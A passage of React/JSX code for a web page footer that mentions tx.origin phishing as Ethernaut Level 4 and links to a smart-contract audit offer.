            tx.origin phishing is Level 4 in Ethernaut. Try to solve it yourself, 
            then get your contracts audited by our team to ensure you haven't made 
            similar mistakes.
          </p>
          <Link
            href="/"
            className="inline-flex items-center gap-2 px-4 py-2 bg-lime-400 text-black font-semibold rounded-lg hover:bg-lime-300 transition-colors"
          >
            Get a Free Audit
            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14 5l7 7m0 0l-7 7m7-7H3" />
            </svg>
          </Link>
        </div>
      </footer>
    </div>
  );
}
